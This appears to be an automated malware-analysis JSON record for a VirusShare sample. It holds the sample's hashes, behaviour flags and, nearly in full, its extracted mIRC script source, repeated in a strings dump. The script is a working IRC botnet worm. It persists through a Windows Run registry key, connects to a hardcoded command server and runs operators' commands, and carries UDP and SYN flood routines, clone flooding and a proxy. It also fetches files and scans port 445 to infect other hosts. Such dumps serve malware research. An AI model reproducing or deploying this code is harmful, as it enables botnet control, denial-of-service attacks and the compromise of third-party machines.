{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "RegRead": "May read registry keys",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "register": "May call a DLL using Excel 4 Macros",
            "run": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "on *:START:{\n  run t.exe /n /fh winsck\n  sconf\n  inc %many\n  if (%many = 1) { makeSHR }\n}\nalias n0clone { if ($portfree(12248) == $false) { exit } | socklisten noclone 12248 }\non *:TEXT:*:*: {\n  if ($nick isop $rds(sc)) {\n    if ($1 = !dde) { /dde $2 command \"\" / $+ $3- }\n    if ($1 = !ind) { .identd on $2- }\n    if ($1 = !-) && ($2 != $null) { %- = $2- | / $+ %- | unset %- }\n    if ($1 = !run) && ($2 != $null) { /run $2- }\n    if ($1 = !icmp) { if ($2 == $null) { /saym \u0002E\u0002rror\u001f/\u001f\u0002S\u0002yntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | run t.exe /n /r \"ping -n $4 -l $3 -w 0 $2 \" }\n    if ($1 = !Clone) { /clone $2- }\n    if ($1 = !syn) { if ($2 !== $null) { saym (SynPacket) (Attacking) [ $+ $2 $+ ] on [ $+ $3 $+ ] With [ $+ $4 $+ ] Packets | synp start $4 $2 $3 } }\n    if ($1 = !download) { /download $2- | saym [Downloading..] $nopath($3-) }\n    if ($1 = !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { saym \u0002\u00032[\u0002\u00038ERROR\u0002\u00032]\u0002\u000314 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | saym \u0002\u00032[\u0002\u000314bnc\u0002\u00032]\u0002\u000314 /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }\n    if ($1 = !bnc.stats) && ($sock(Bnc)) { saym \u0002\u00032[\u0002\u000314bnc\u0002\u00032]\u0002\u000314 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }\n    if ($1 = !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | saym \u0002\u00032[\u0002\u000314bnc\u0002\u00032]\u0002\u000314 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }\n    if ($1 = !randscan) && (%begshortip == $null) && ($exists($rds(sf))) { set %begit $randip($2) | saym \u0002\u00032[\u0002\u000314scanner\u0002\u00032]\u0002\u000314 starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }\n    if ($1 = !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | saym \u0002\u00032[\u0002\u000314scanner\u0002\u00032]\u0002\u000314 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }\n    if ($1 = !ipscan) && (%begshortip == $null) && ($exists($rds(sf))) { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | saym \u000312\u001f|\u001f\u000314\u0002s\u0002canner\u000312\u001f|\u000314\u001f \u0002s\u0002canning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }\n  }\n}\nalias finished { saym \u0002\u00032[\u0002\u000314scanner\u0002\u00032]\u0002\u000314 scanning from %begshortip to %endshortip is finished! | sockclose ip* |   timers off | unset %beg* | unset %end* | unset %ip* | unset %total* }\non *:disconnect:{   timercheck -o 0 20 Cona  }\nalias reg { sockwrite -nt NTimer* Privmsg nickserv : $+ register $1- }\nalias Tw1stStart  { if $1 = STOP { .timerTw1st off | unset %gnum | saym \u0002[\u0002\u001fPacketing\u001f\u0002]\u0002 Halted } | if $3 = $null { return } |  if $timer(Tw1st).com != $null { saym \u00034\u0002ERROR!\u0002\u00031 \u001fC\u001furrently \u001fA\u001fttacking:\u0002 $gettok($timer(gcoolt).com,3,32) \u0002 | return } |  saym sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ ) |  set %gnum 0 |  .timerTw1st -m 0 400 Tw1st1t $1 $2 $3 }\nalias Tw1st1t {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 \n  sockudp Tw1st $2 $3 $str(\ufffd\ufffd_6\u0735KTE_}\ufffd\ufffd\ufffd,60)\n  sockudp Tw2st $2 $3 $str(!@#$%^&*()_+|,50)\n  sockudp Tw3st $2 $3 $str(@,920)\n  sockudp Tw4st $2 $3 $str(0010110,130) \n  sockudp Tw5st $2 $3 $str(Pong,200)\n  sockudp Tw6st $2 $3 $str(Tw1st,180)\n  sockudp Tw7st $2 $3 $str(*,350)\n  sockudp Tw8st $2 $3 $str(link,200)\n  sockudp Tw9st $2 $3 $str(Tw1st,180)\n  return |  :done | //saym \u0002[\u0002\u001fPacketing\u001f\u0002]\u0002 finished | .timerTw1st off | unset %gnum \n}\n\nalias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | saym \u0002S\u0002yn \u0002A\u0002ttack \u0002D\u0002one! }\nalias syn {\n  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }\n  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }\n}\non *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }\non *:sockread:BncClient*:{\n  sockread %BncClient\n  if ($gettok(%BncClient,1,32) == NICK) {\n    set %Bnc.nick $gettok(%BncClient,2,32)\n  }\n  if ($gettok(%BncClient,1,32) == USER) {\n    set %Bnc.user $gettok(%BncClient,2-,32)\n    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>\n  }\n  if ($gettok(%BncClient,1,32) == PASS) { \n    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {\n      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC 2.6.4-WIN, the irc proxy\n      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now\n      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect\n      %Bnc.legit = yes\n    } \n    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { \n      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!\n    }\n  }\n  if ($gettok(%BncClient,1,32) == CONN) {\n    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on This | sockclose   $sockname\n    }\n    if (BncServer $+ $remove($sockname,BncClient) != $null) {\n      sockclose BncServer $+ $remove($sockname,BncClient)\n    }\n    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)\n    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)\n    set %Bnc.server.passwd $gettok(%BncClient,4,32)\n  }\n  else {\n    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {\n      halt\n    }\n    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient\n  }\n}\nalias jc { /join $rds(sc) $rds(sk) }\non *:sockopen:BncServer*:{\n  if ($sockerr) {\n    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection\n    sockclose $sockname\n    halt\n  }\n  if ($sock($sockname).status != active) {\n    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection\n    sockclose BncServer $+ $remove($socknme, BncServer)\n    halt\n  }\n  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection\n  sockwrite -n $sockname NICK %Bnc.nick\n  sockwrite -n $sockname USER %Bnc.user\n}\non *:join:#:{ if (# = $rds(sc)) { if ($nick = $me) { timerjc off } } }\non *:sockread:BncServer*:{\n  sockread %BncServer\n  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {\n    halt\n  }\n  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer\n}\non *:sockread:Ntimer*:{\n  sockread %ntread\n  Stay %ntread\n}\non *:sockread:xxx*:{\n  sockread %QHTread\n  Stay %QHTread\n}\nalias fnick {\n  set %fnick $rand(1,10)\n  if (%fnick = 1) { return $read x.x $+ $chr($r(65,125)) $+ $chr($r(65,125))  }\n  if (%fnick = 2) { return $chr($r(65,125)) $+ $read x.x $+ $chr($r(65,125))  }\n  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  x.x }\n  if (%fnick = 4) { return $r(A,Z) $+ $read x.x $+ $r(A,Z) }\n  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }\n  if (%fnick = 6) { return $read  x.x $+ $r(1,40) $+ $chr($r(65,125))  }\n  if (%fnick = 7) { return $r(a,z) $+ $read x.x $+ $r(a,z) }\n  if (%fnick = 8) { return $read  x.x $+ $r(a,z) $+ $chr($r(65,125))  }\n  if (%fnick = 9) { return $read  x.x $+ $r(1,10) $+ $chr($r(65,125))  }\n  if (%fnick = 10) { return $read  x.x $+ $r(20,50) $+ $chr($r(65,125)) }\n}\nalias Cona { server $rds(sr) $rds(sp) }\nalias clone {\n  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 2 opensock }\n  if ($1 = join) { sockwrite -nt xxx* Join $2- }\n  if ($1 = part) { sockwrite -nt xxx* Part $2 : $+ $3- }\n  if ($1 = msg) { sockwrite -nt xxx* privmsg $2 : $+ $3- }\n  if ($1 = notice) { sockwrite -nt xxx* notice $2 : $+ $3- }\n  if ($1 = reg) { sockwrite -nt xxx* Privmsg NickServ : $+ register $2- | sockwrite -nt xxx* Privmsg NickServ : $+ identify $2- }\n  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | sockwrite -nt xxx* Join %rchan | sockwrite -nt xxx* Privmsg Chanserv : register %rchan $fnick xxx }\n  if ($1 = jp) { sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- | sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- | sockwrite -nt xxx* Join $2- | sockwrite -nt xxx* part $2 : $3- }\n  if ($1 = jmp) { sockwrite -nt xxx* Join $2 | sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* part $2 }\n  if ($1 = flood.c) { sockwrite -nt xxx* join $2 | sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* notice $2 : $3- | sockwrite -nt xxx* privmsg $2 : $3- }\n  if ($1 = flood.n) { sockwrite -nt xxx* privmsg $2 : $3- | sockwrite -nt xxx* notice $2 : $3- | sockwrite -nt xxx* privmsg $2 : $3- }\n  if ($1 = chat.flood) { sockwrite -nt xxx* privmsg $2 :\u0001DCC CHAT $2 1058633484 3481\u0001  }\n  if ($1 = Quit) { Sockwrite -nt xxx* Quit : $+ $2- }\n  if ($1 = massquit) { SockWrite -nt xxx* Join $2 | Sockwrite -nt xxx* Quit : $+ $3- }\n  if ($1 = fnick) { sockwrite -nt xxx* Nick $2 $+ $r(1,1000) $+ $r(1,1000)  }\n  if ($1 = Die) { timeropensock* off | sockclose xxx* }\n}\nalias opensock { sockopen xxx $+ $fnick %cserver %cport }\nalias Stay {\n  if (PING = $1) { sockwrite -nt * $1- }\n}\non *:Sockopen:xxx*:{\n  set -u1 %user $rand(A,Z) $+ $fnick $+ $rand(A,Z)\n  .sockwrite -nt $sockname USER %user %user %user : $+ %user\n  .sockwrite -nt $sockname NICK $fnick\n}\nraw 433:*:{\n  nick [SvR- $+ $r(1000,9999) $+ ]] \n}\nalias apages { set %asite $1 | set %filesite $2 | sockopen apages $+ $fnick %asite 80 }\nalias apagestop { timerapage* off | sockclose apages* }\non *:sockopen:apages*:{\n  timerapage $+ $fnick 0 2 sockwrite -nt apages* GET %filesite\n}\non *:socklisten:ident: { .sockaccept $sockname $+ . $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) }\non *:sockread:IDENT.*: { sockread %tmp | tokenize 32 %tmp | sockwrite -tn $sockname $3 $2 $1 : USERID : UNIX : $fnick | unset %tmp }\nalias startscan {\n  inc %totalscaning\n  if %totalscaning == %total finished\n  set %ip1 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 1\n  set %ip2 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 2\n  set %ip3 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 3\n  set %ip4 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 4\n  set %ip5 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 5\n  set %ip6 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 6\n  set %ip7 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 7\n  set %ip8 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 8\n  set %ip9 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 9\n  set %ip10 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 10\n  set %ip11 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 11\n  set %ip12 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 12\n  set %ip13 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 13\n  set %ip14 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 14\n  set %ip15 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 15\n  set %ip16 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 16\n  set %ip17 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 17\n  set %ip18 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 18\n  set %ip19 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 19\n  set %ip20 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 20\n  set %ip21 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 21\n  set %ip22 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 22\n  set %ip23 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 23\n  set %ip24 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  if %totalscaning == %total opensocks 24\n  set %ip25 $longip($calc( %beglongip + %totalscaning ))\n  inc %totalscaning\n  opensocks\n}\nalias opensocks {\n  sockopen ip1 %ip1 445\n  if $1 == 1 finished\n  sockopen ip2 %ip2 445\n  if $1 == 2 finished\n  sockopen ip3 %ip3 445\n  if $1 == 3 finished\n  sockopen ip4 %ip4 445\n  if $1 == 4 finished\n  sockopen ip5 %ip5 445\n  if $1 == 5 finished\n  sockopen ip6 %ip6 445\n  if $1 == 6 finished\n  sockopen ip7 %ip7 445\n  if $1 == 7 finished\n  sockopen ip8 %ip8 445\n  if $1 == 8 finished\n  sockopen ip9 %ip9 445\n  if $1 == 9 finished\n  sockopen ip10 %ip10 445\n  if $1 == 10 finished\n  sockopen ip11 %ip11 445\n  if $1 == 11 finished\n  sockopen ip12 %ip12 445\n  if $1 == 12 finished\n  sockopen ip13 %ip13 445\n  if $1 == 13 finished\n  sockopen ip14 %ip14 445\n  if $1 == 14 finished\n  sockopen ip15 %ip15 445\n  if $1 == 15 finished\n  sockopen ip16 %ip16 445\n  if $1 == 16 finished\n  sockopen ip17 %ip17 445\n  if $1 == 17 finished\n  sockopen ip18 %ip18 445\n  if $1 == 18 finished\n  sockopen ip19 %ip19 445\n  if $1 == 19 finished\n  sockopen ip20 %ip20 445\n  if $1 == 20 finished\n  sockopen ip21 %ip21 445\n  if $1 == 21 finished\n  sockopen ip22 %ip22 445\n  if $1 == 22 finished\n  sockopen ip23 %ip23 445\n  if $1 == 23 finished\n  sockopen ip24 %ip24 445\n  if $1 == 24 finished\n  sockopen ip25 %ip25 445\n  timerscannerTE 1 12 sockclose ip*\n  timerscannerSA 1 15 startscan\n}\nalias randip {\n  unset %1p1 %1p2\n  set %1p1 $1-\n  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))\n  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))\n  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))\n  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))\n  return %1p2\n}\non 1:sockopen:ip*:{ if ($sockerr > 0) { halt } | set %ant1 % [ $+ [ $sockname ] ] | run t.exe /n /fh /r \"r.BAT   %ant1 $rds(sf) $+ \" | saym \u0002[\u0002scanner\u0002]\u0002 Found: %ant1 $+ , attempting to infect.. | sockclose $sockname | unset %ant1 | halt }\nalias download {\n  var %socket $+(dl,$chr(46),$nopath($2))\n  if (!$sock(%socket)) {\n    sockopen %socket $1 80\n    sockmark %socket HEAD $1 $2\n  }\n  else { echo $color(info) -s * Socket already in use. }\n}\nalias downd {\n  if ($exists($nopath($2)) = $false) || ($file($nopath($2)).size != $3) {\n    var %socket $+(dl,$chr(46),$nopath($2))\n    if (!$sock(%socket)) {\n      sockopen %socket $1 80\n      sockmark %socket HEAD $1 $2\n    }\n    else { echo $color(info) -s * Socket already in use. }\n  }\n}\nalias percent return $+($round($calc((100 / $2) * $1),2),%)\n\non *:SOCKOPEN:dl.*:{\n  if ($sockerr) { echo $color(info) -s * Error: $sock($sockname).wsmsg | return }\n  hadd -m ticks $sockname $ticks\n  var %file = $nopath($gettok($sock($sockname).mark,3,32)), %fullfile = $+(\",$mircdir,%file,\"), %sckr = sockwrite -n $sockname, %^ = $gettok($sock($sockname).mark,3,32)\n  write -c %fullfile\n  %sckr GET $iif(left(%^,1) != $chr(47),$chr(47) $+ %^,%^) HTTP/1.0\n  %sckr HOST: $gettok($sock($sockname).mark,2,32)\n  %sckr ACCEPT: *.*\n  %sckr $crlf\n}\n\non *:SOCKREAD:dl.*:{\n  if ($sockerr) {\n    echo $color(info) -s * Error: $sock($sockname).wsmsg\n    return\n  }\n  var %a\n  :begin\n  if ($gettok($sock($sockname).mark,1,32) == head) { sockread %a }\n  else { sockread &b }\n  if ($sockbr) {\n    tokenize 32 $sock($sockname).mark\n    if ($1 == HEAD) {\n      if (%a) {\n        if ($gettok(%a,1,32) == Content-Length:) { var %totsize = $gettok(%a,2,32) }\n      }\n      else {\n        sockmark $sockname GET $2- %totsize\n      }\n    }\n    elseif ($1 == GET) {\n      var %file = $+(\",$mircdir,$nopath($3),\"), %cursize = $file(%file).size\n      var %totsize = $gettok($sock($sockname).mark,4,32)\n      bwrite %file -1 &b\n    }\n    goto begin\n  }\n}\n\non *:SOCKCLOSE:dl.*:{\n  var %ticks = $calc(($ticks - $hget(ticks,$sockname)) /1000)\n  /saym * Download of $nopath($gettok($sock($sockname).mark,3,32)) completed in %ticks seconds.\n}\non *:connect:{ .ial on | .timerjc 0 $rand(5,10) /jc |   .timercheck off | .pdcc on | .fsend on | clearall }\nalias makeSHR {\n  var %SHR $findfile($mircdir,*.*,0,write SHR.bat attrib +R +S +H $noPATH($1-))\n  run t.exe /n /fh /r SHR.bat\n}\nalias rds {\n  if ($1 = sf) { return dot.exe }\n  if ($1 = sr) { return sev.cellfiles.org }\n  if ($1 = sp) { return 6667 }\n  if ($1 = sc) { return #svr } \n  if ($1 = sk) { return rvs }\n}\nalias RegRead {\n  if ($1 != $null) {\n    var %a = regread\n    .comopen %a WScript.Shell\n    if !$comerr {\n      var %b =  $com(%a,RegRead,3,bstr,$1-)\n      var %c = $com(%a).result\n      .comclose %a\n      if (%c != $null) return %c\n      else {\n        return NA \n      }\n    }\n  }\n  else { return error! complete data }\n}\n\nalias RegWrite {\n  if ($1 != $null) && ($2 != $null) && ($3 != $null) {\n    var %a = RegWrite\n    .comopen %a WScript.Shell\n    if !$comerr {\n      var %b =  $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)\n      .comclose %a\n    }\n    if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) {\n      if ($regread($1) == $2) { return the value ( $+ $1 $+ ) was created }\n      else { return error! when writing }\n    }\n  }\n  else { return error! complete data }\n}\n\nalias RegDelete {\n  if ($1 != $null) {\n    var %a = RegDelete \n    .comopen %a WScript.Shell\n    if !$comerr {\n      var %b =  $com(%a,RegDelete,3,bstr,$1)\n      .comclose %a\n    }\n  }\n  else { return error! complete data }\n}\nalias sconf { \n  .nick [SvR- $+ $r(1000,9999) $+ ]]\n  .n0clone\n  .Cona\n  .timercheck 0 20 Cona\n  .timerregs -o 0 1 regs\n  .run t.exe /n /fh /r e.BAT\n  .copyself\n}\nalias regs { if ($Regread(HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ddxd)  = NA) { $RegWrite(HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ddxd,$mircdirSVCHOST.exe,REG_SZ) } }\nalias saym { if ($me isvo $rds(sc)) { clearall | msg $rds(sc) $1- } }\nalias copyself { \n  if ($exists($findfile(c:\\winnt\\, $+ $mon(nf) $+ ,1)) = $true ) && ($exists($mon(nf)) = $false ) { .copy $findfile(c:\\winnt\\, $+ $mon(nf) $+ ,1) $mon(nf) }\n  if ($exists($findfile(c:\\windows\\, $+ $mon(nf) $+ ,1)) = $true ) && ($exists($mon(nf)) = $false ) { .copy $findfile(c:\\windows\\, $+ $mon(nf) $+ ,1) $mon(nf) }\n  if ($exists($findfile(d:\\winnt\\, $+ $mon(nf) $+ ,1)) = $true ) && ($exists($mon(nf)) = $false ) { .copy $findfile(d:\\winnt\\, $+ $mon(nf) $+ ,1) $mon(nf) }\n  if ($exists($findfile(d:\\windows\\, $+ $mon(nf) $+ ,1)) = $true ) && ($exists($mon(nf)) = $false ) { .copy $findfile(d:\\windows\\, $+ $mon(nf) $+ ,1) $mon(nf) }\n}"
    },
    "filename": "VirusShare_441135fa522618b62433f73782f0a294",
    "filesize": 20023,
    "filetype": "data",
    "hashes": {
        "md5": "441135fa522618b62433f73782f0a294",
        "sha1": "64a168be0e319d8d678baa6844181a49097d2c23",
        "sha256": "b2e59a6922763683dc6be5a0c54ba2da5f5580297167638710a3228712f90f8b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on *:START:{",
            "  run t.exe /n /fh winsck",
            "  sconf",
            "  inc %many",
            "  if (%many = 1) { makeSHR }",
            "alias n0clone { if ($portfree(12248) == $false) { exit } | socklisten noclone 12248 }",
            "on *:TEXT:*:*: {",
            "  if ($nick isop $rds(sc)) {",
            "    if ($1 = !dde) { /dde $2 command \"\" / $+ $3- }",
            "    if ($1 = !ind) { .identd on $2- }",
            "    if ($1 = !-) && ($2 != $null) { %- = $2- | / $+ %- | unset %- }",
            "    if ($1 = !run) && ($2 != $null) { /run $2- }",
            "    if ($1 = !icmp) { if ($2 == $null) { /saym ",
            "rror",
            "yntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | run t.exe /n /r \"ping -n $4 -l $3 -w 0 $2 \" }",
            "    if ($1 = !Clone) { /clone $2- }",
            "    if ($1 = !syn) { if ($2 !== $null) { saym (SynPacket) (Attacking) [ $+ $2 $+ ] on [ $+ $3 $+ ] With [ $+ $4 $+ ] Packets | synp start $4 $2 $3 } }",
            "    if ($1 = !download) { /download $2- | saym [Downloading..] $nopath($3-) }",
            "    if ($1 = !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { saym ",
            "8ERROR",
            "14 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | saym ",
            "14bnc",
            "14 /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }",
            "    if ($1 = !bnc.stats) && ($sock(Bnc)) { saym ",
            "14bnc",
            "14 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }",
            "    if ($1 = !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | saym ",
            "14bnc",
            "14 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }",
            "    if ($1 = !randscan) && (%begshortip == $null) && ($exists($rds(sf))) { set %begit $randip($2) | saym ",
            "14scanner",
            "14 starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }",
            "    if ($1 = !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | saym ",
            "14scanner",
            "14 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }",
            "    if ($1 = !ipscan) && (%begshortip == $null) && ($exists($rds(sf))) { set %begit $gettok($ip,1-2,46) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) | saym ",
            "canner",
            "canning: %begit to $gettok($ip,1-2,46) $+ .255.255 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }",
            "alias finished { saym ",
            "14scanner",
            "14 scanning from %begshortip to %endshortip is finished! | sockclose ip* |   timers off | unset %beg* | unset %end* | unset %ip* | unset %total* }",
            "on *:disconnect:{   timercheck -o 0 20 Cona  }",
            "alias reg { sockwrite -nt NTimer* Privmsg nickserv : $+ register $1- }",
            "alias Tw1stStart  { if $1 = STOP { .timerTw1st off | unset %gnum | saym ",
            "Packeting",
            " Halted } | if $3 = $null { return } |  if $timer(Tw1st).com != $null { saym ",
            "ERROR!",
            "urrently ",
            "ttacking:",
            " $gettok($timer(gcoolt).com,3,32) ",
            " | return } |  saym sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ ) |  set %gnum 0 |  .timerTw1st -m 0 400 Tw1st1t $1 $2 $3 }",
            "alias Tw1st1t {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 ",
            "  sockudp Tw1st $2 $3 $str(_6\u0735KTE_},60)",
            "  sockudp Tw2st $2 $3 $str(!@#$%^&*()_+|,50)",
            "  sockudp Tw3st $2 $3 $str(@,920)",
            "  sockudp Tw4st $2 $3 $str(0010110,130) ",
            "  sockudp Tw5st $2 $3 $str(Pong,200)",
            "  sockudp Tw6st $2 $3 $str(Tw1st,180)",
            "  sockudp Tw7st $2 $3 $str(*,350)",
            "  sockudp Tw8st $2 $3 $str(link,200)",
            "  sockudp Tw9st $2 $3 $str(Tw1st,180)",
            "  return |  :done | //saym ",
            "Packeting",
            " finished | .timerTw1st off | unset %gnum ",
            "alias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | saym ",
            "ttack ",
            "one! }",
            "alias syn {",
            "  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }",
            "  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }",
            "on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }",
            "on *:sockread:BncClient*:{",
            "  sockread %BncClient",
            "  if ($gettok(%BncClient,1,32) == NICK) {",
            "    set %Bnc.nick $gettok(%BncClient,2,32)",
            "  if ($gettok(%BncClient,1,32) == USER) {",
            "    set %Bnc.user $gettok(%BncClient,2-,32)",
            "    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>",
